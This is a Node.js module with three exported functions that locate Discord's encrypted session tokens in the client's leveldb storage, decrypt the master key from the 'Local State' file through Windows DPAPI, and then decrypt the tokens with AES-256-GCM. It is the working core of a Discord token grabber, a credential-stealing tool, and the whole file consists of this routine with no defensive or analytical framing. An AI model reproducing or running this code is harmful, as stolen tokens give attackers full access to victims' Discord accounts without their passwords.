const fs = require('fs')
const path = require("path")
const wp = require("win-protect");
const crypto = require('crypto');

/**
 * Scans a directory for files containing encrypted tokens and returns them.
 * 
 * @param {string} discordPath - The directory path to the Discord client.
 * @returns {string[] | null} A list of found encrypted tokens or null if no tokens are found.
 */
function findEncryptedTokensFromPath(discordPath) {
    const tokens = [];
    const tokensPath = path.join(discordPath, "Local Storage", "leveldb");

    // Return null if the directory doesn't exist
    if (!fs.existsSync(tokensPath)) return null

    // Read all files in the leveldb directory
    fs.readdirSync(tokensPath).forEach(file => {
        // Read the file content and extract token-like patterns
        if (["log", "ldb"].includes(file.split(".")[1])) tokens.push(...fs.readFileSync(path.join(tokensPath, file), "utf-8").match(/dQw4w9WgXcQ:[^\"]*/g) || [])
    });
    return tokens;
}

/**
 * Retrieves the master decryption key from the Local State file.
 * 
 * @param {string} discordPath - The directory path to the Discord client.
 * @returns {Buffer | null} The decrypted master key as a buffer or null if not found.
 */
function getMasterKey(discordPath) {
    const masterPath = path.join(discordPath, "Local State");

    // Return null if the file does not exist
    if (!fs.existsSync(masterPath)) return null
    // Read the Local State file, parse it, and decrypt the encrypted master key
    return wp.decrypt(Buffer.from(JSON.parse(fs.readFileSync(masterPath, "utf-8")).os_crypt.encrypted_key, 'base64').slice(5));
}

/**
 * Decrypts an encrypted token using the provided master key.
 * 
 * @param {string} encToken - The encrypted token string.
 * @param {Buffer} masterKey - The master decryption key used to decrypt the token.
 * @returns {string} The decrypted token as a UTF-8 string.
 */
function decryptToken(encToken, masterKey) {
    // Extract and decode the encrypted token part from the input string
    const buff = Buffer.from(encToken.split('dQw4w9WgXcQ:')[1], 'base64');
    const payload = buff.slice(15);
    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, buff.slice(3, 15));
    decipher.setAuthTag(payload.slice(-16));

    // Decrypt the payload and combine the result
    return Buffer.concat([decipher.update(payload.slice(0, -16)), decipher.final()]).toString('utf-8')
}

module.exports = {
    findEncryptedTokensFromPath,
    getMasterKey,
    decryptToken
}